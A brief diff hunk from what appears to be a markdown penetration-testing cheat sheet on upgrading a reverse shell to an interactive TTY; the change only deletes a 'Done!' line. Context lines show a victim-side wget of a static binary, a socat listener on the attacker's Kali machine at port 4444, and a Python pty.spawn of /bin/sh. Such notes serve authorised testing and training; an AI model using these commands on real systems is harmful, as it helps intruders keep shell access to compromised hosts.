@@ -20,8 +20,6 @@ Victim: ```wget -q https://github.com/andrew-d/static-binaries/raw/master/binari
         
 Kali:   ```socat file:`tty`,raw,echo=0 tcp-listen:4444```
 
-Done!
-
 ### With Python
 
 Victim: ```python3 -c 'import pty; pty.spawn("/bin/sh")'```
